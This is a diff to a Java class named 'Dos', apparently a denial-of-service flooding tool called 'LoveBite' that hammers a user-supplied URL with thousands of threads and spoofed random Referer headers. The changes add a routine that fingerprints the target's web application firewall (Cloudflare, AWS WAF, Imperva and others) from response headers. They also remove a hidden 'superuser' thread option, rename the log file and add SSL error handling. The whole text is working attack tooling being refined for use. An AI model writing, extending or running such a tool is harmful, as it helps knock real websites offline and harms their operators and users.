@@ -7,6 +7,19 @@ import java.util.*;
 import java.util.concurrent.ExecutorService;
 import java.util.concurrent.Executors;
 import javax.net.ssl.HttpsURLConnection;
+import javax.net.ssl.SSLException;
+import javax.net.ssl.SSLHandshakeException;
+import javax.net.ssl.SSLKeyException;
+import javax.net.ssl.SSLPeerUnverifiedException;
+import javax.net.ssl.SSLProtocolException;
+import javax.net.ssl.SSLContext;
+import javax.net.ssl.TrustManager;
+import javax.net.ssl.X509TrustManager;
+import java.security.cert.CertPathValidatorException;
+import java.security.cert.X509Certificate;
+import java.security.NoSuchAlgorithmException;
+import java.security.KeyManagementException;
+
 
 /*
  * Set a Thread limit. to get better performance you have to know how to handle threads. 
@@ -16,16 +29,26 @@ import javax.net.ssl.HttpsURLConnection;
 
 
 public class Dos implements Runnable {
-    private static final String GREEN = "\033[0;32m";
-    private static final String RED = "\033[0;31m";
     private static final String ORANGE = "\033[0;33m";
     private static final String BLUE = "\033[0;34m";
     private static final String CYAN = "\033[0;36m";
     private static final String PINK = "\033[0;35m";
     private static final String DARK_GREEN = "\033[0;32m";
     private static final String WHITE = "\033[0;37m";
-    private static final String RESET = "\033[0m";
+    private static final String RED = "\033[0;31m"; // Error
+    private static final String GREEN = "\033[0;32m"; // Success
+    private static final String YELLOW = "\033[0;33m"; // Warning
+    private static final String RESET = "\033[0m"; // Reset color
 
+
+
+    private static final String[] FIREWALLS = {
+        "Cloudflare WAF", "AWS WAF", "Azure Web Application Firewall", "Google Cloud Armor",
+        "Sucuri Website Firewall", "Imperva Incapsula", "F5 BIG-IP ASM", "ModSecurity",
+        "Barracuda Web Application Firewall", "Fortinet FortiWeb", "Qualys Web Application Firewall",
+        "SonicWall WAF", "Radware AppWall", "Citrix Web App Firewall"
+    };
+    
     private static int amount = 0;
     private static String url = "";
     private static int successfulRequests = 0;
@@ -87,7 +110,7 @@ public class Dos implements Runnable {
     // Generate Referer to manipulate website 
     public static String generateReferer() {
         Random random = new Random();
-        int length = 6 + random.nextInt(8); // Random length between 6 and 14
+        int length = 8 + random.nextInt(8); // Random length between 6 and 14
         String domain = generateRandomString(length);
         String[] extensions = {".com", ".org", ".net", ".info", ".biz", ".us", ".co", ".uk", ".ca", ".de", ".jp", ".au", ".fr", ".it", ".nl", ".ru", ".ch", ".in", ".br", ".mx", ".kr", ".se", ".es", ".cn", ".tv", ".me", ".int", ".edu", ".gov", ".mil", ".name", ".pro", ".aero", ".museum", ".coop", ".jobs", ".tel", ".asia", ".cat", ".post", ".mobi", ".bz", ".ws", ".eu", ".cc", ".co.uk", ".us.com", ".uk.com", ".org.uk", ".net.uk", ".gov.uk", ".ltd.uk", ".pl", ".be", ".at", ".li", ".hu", ".sk", ".cz", ".ro", ".bg", ".gr", ".pt", ".tr", ".ae", ".sa", ".il", ".qa", ".om", ".kw", ".pk", ".bd", ".np", ".lk", ".sg", ".my", ".ph", ".id", ".vn", ".th", ".tw", ".hk", ".mo", ".pw", ".fm", ".am", ".ai", ".cv", ".dj", ".dm", ".gs", ".gy", ".ht", ".lc", ".mf", ".nu", ".re", ".sc", ".sr", ".st", ".su", ".tg", ".tk", ".tm", ".to", ".vg", ".vu", ".za", ".nom", ".space", ".fun", ".online", ".site", ".store", ".tech", ".app", ".design", ".club", ".blog", ".agency", ".company", ".inc", ".shop", ".travel", ".zone", ".rocks", ".love", ".guru", ".photo", ".pics", ".today", ".win", ".top", ".life", ".email"};
         
@@ -140,8 +163,8 @@ public class Dos implements Runnable {
 
     private static void printUsage() {
         System.out.println(DARK_GREEN + "................... How to use this code .........................." + RESET);
-        System.out.println(DARK_GREEN + "  kiss me (url) => Paste url here\n How Much U Love Me🤔 => Set Threads" + RESET);
-        System.out.println(DARK_GREEN + "  2. Set Thread: Choose the number of threads (default: 9999)." + RESET);
+        System.out.println(DARK_GREEN + "  kiss me (url) => Paste url here\n  How Much U Love Me🤔 => Set Threads" + RESET);
+        System.out.println(DARK_GREEN + "  Set Thread: Choose the number of threads (default: 9999)." + RESET);
         System.out.println(DARK_GREEN + "     Minimum: 999, Maximum: 15999." + RESET);
     }
 
@@ -164,8 +187,7 @@ public class Dos implements Runnable {
                     return; // Exit if unknown argument is found
             }
         }
-
-        
+    
         try (Scanner in = new Scanner(System.in)) {
             // Display Banner
             displayBanner();
@@ -177,20 +199,17 @@ public class Dos implements Runnable {
                 System.out.println(RED + "Invalid URL. Exiting." + RESET);
                 return;
             }
+    
             // User Input for Number of Threads
             System.out.print(ORANGE + "How Much U Love Me🤔 =>  " + RESET);
             String amountStr = in.nextLine();
             int defaultThreadLimit = 9999;
             int minThreadLimit = 999;
             int maxThreadLimit = 15999;
-            int superuser = 89999;
             int userThreads = (amountStr == null || amountStr.isEmpty()) ? defaultThreadLimit : Integer.parseInt(amountStr);
             if (userThreads < minThreadLimit) {
                 System.out.println(RED + "Thread count too low. Setting to minimum: " + minThreadLimit + RESET);
                 userThreads = minThreadLimit;
-            } else if ( userThreads == 1601 ){
-                System.out.println(GREEN + "SuperUser Set: " + superuser + RESET);
-                userThreads = maxThreadLimit;
             } else if (userThreads > maxThreadLimit) {
                 System.out.println(RED + "Thread count too high. Setting to maximum: " + maxThreadLimit + RESET);
                 userThreads = maxThreadLimit;
@@ -202,12 +221,13 @@ public class Dos implements Runnable {
             System.out.println(WHITE + "Checking firewall status..." + RESET);
     
             // Call the firewallCheck method directly without storing the result
-            if (firewallCheck(url)) {
-                System.out.println(RED + "Firewall Found" + RESET);
-            } else {
-                System.out.println(GREEN + "Firewall Not Found" + RESET);
+            boolean isFirewallDetected = firewallCheck(url);
+            if (isFirewallDetected) {
+                System.out.println(RED + "Firewall detected." + RESET);
+            } else{
+                System.out.println(GREEN + "No firewall detected." + RESET);
             }
-    
+
             // Check Connection
             System.out.println(ORANGE + "Checking connection to Site..." + RESET);
             if (url.startsWith("http://")) {
@@ -331,7 +351,7 @@ public class Dos implements Runnable {
     }
     
     private static void saveLog() {
-        try (BufferedWriter writer = new BufferedWriter(new FileWriter("LoveBite_log.txt", true))) {
+        try (BufferedWriter writer = new BufferedWriter(new FileWriter("LoveBiteV2_log.txt", true))) {
             SimpleDateFormat sdf = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss");
             String timestamp = sdf.format(new Date());
             writer.write("Timestamp: " + timestamp);
@@ -352,31 +372,75 @@ public class Dos implements Runnable {
         }
     }
     
+    private static final Map<String, String> FIREWALL_SIGNATURES = new HashMap<>();
+    static {
+        FIREWALL_SIGNATURES.put("Cloudflare WAF", "cf-ray");
+        FIREWALL_SIGNATURES.put("AWS WAF", "X-Amz-Cf-Id");
+        FIREWALL_SIGNATURES.put("Azure Web Application Firewall", "x-ms-waf");
+        FIREWALL_SIGNATURES.put("Google Cloud Armor", "X-Cloud-Trace-Context");
+        FIREWALL_SIGNATURES.put("Sucuri Website Firewall", "x-sucuri-id");
+        FIREWALL_SIGNATURES.put("Imperva Incapsula", "X-CDN-Geo");
+        FIREWALL_SIGNATURES.put("F5 BIG-IP ASM", "BigIP");
+        FIREWALL_SIGNATURES.put("ModSecurity", "X-Mod-Security");
+        FIREWALL_SIGNATURES.put("Barracuda Web Application Firewall", "X-Barracuda-Server");
+        FIREWALL_SIGNATURES.put("Fortinet FortiWeb", "X-Fortinet");
+        FIREWALL_SIGNATURES.put("Qualys Web Application Firewall", "X-QA");
+        FIREWALL_SIGNATURES.put("SonicWall WAF", "X-SonicWall");
+        FIREWALL_SIGNATURES.put("Radware AppWall", "X-Radware");
+        FIREWALL_SIGNATURES.put("Citrix Web App Firewall", "X-Citrix");
+    }
+
     private static boolean firewallCheck(String url) {
-        HttpURLConnection connection = null;
-        try {
-            URL targetUrl = new URL(url);
-            connection = (HttpURLConnection) targetUrl.openConnection();
-            connection.setRequestMethod("HEAD"); // Use HEAD method to just check connectivity
-            connection.setConnectTimeout(5000); // Set timeout for connection
-            connection.setReadTimeout(5000); // Set timeout for reading
-    
-            int responseCode = connection.getResponseCode();
-            if (responseCode == HttpURLConnection.HTTP_FORBIDDEN) {
-                return true; // Firewall detected
-            } else {
-                return false; // No firewall detected
+    HttpURLConnection connection = null;
+    try {
+        URL targetUrl = new URL(url);
+        connection = (HttpURLConnection) targetUrl.openConnection();
+        connection.setRequestMethod("GET"); // Use HEAD method to just check connectivity
+        connection.setConnectTimeout(5000); // Set timeout for connection
+        connection.setReadTimeout(5000); // Set timeout for reading
+
+        int responseCode = connection.getResponseCode();
+        if (responseCode == HttpURLConnection.HTTP_FORBIDDEN) {
+            // Check for firewall by looking at the headers
+            boolean firewallDetected = false;
+            for (String firewallName : FIREWALLS) {
+                String signature = FIREWALL_SIGNATURES.get(firewallName);
+                if (signature != null && connection.getHeaderField(signature) != null) {
+                    System.out.println(GREEN + firewallName + " detected" + RESET);
+                    firewallDetected = true;
+                }
             }
-    
-        } catch (IOException e) {
-            System.out.println(RED + "Error checking firewall: " + e.getMessage() + RESET);
-            return false;
-        } finally {
-            if (connection != null) {
-                connection.disconnect(); // Always disconnect
+
+            if (!firewallDetected) {
+                System.out.println(GREEN + "No known firewall detected." + RESET);
             }
+
+            return true; // Firewall detected
+        } else {
+            return false; // No firewall detected
+        }
+
+    } catch (SSLHandshakeException e) {
+        System.out.println(RED + "SSL Handshake Error: " + e.getMessage() + RESET);
+        System.exit(1); // Terminate the process
+    } catch (SSLPeerUnverifiedException e) {
+        System.out.println(RED + "SSL Peer Unverified Error: " + e.getMessage() + RESET);
+        System.exit(1); // Terminate the process
+    } catch (SSLException e) {
+        System.out.println(RED + "SSL Exception: " + e.getMessage() + RESET);
+        System.exit(1); // Terminate the process
+    } catch (IOException e) {
+        System.out.println(RED + "IO Error: " + e.getMessage() + RESET);
+        return false;
+    } finally {
+        if (connection != null) {
+            connection.disconnect(); // Always disconnect
         }
     }
+    return false;
+    }
+
+
     
     private HttpURLConnection createHttpURLConnection(URL url) throws IOException {
         return (HttpURLConnection) url.openConnection();
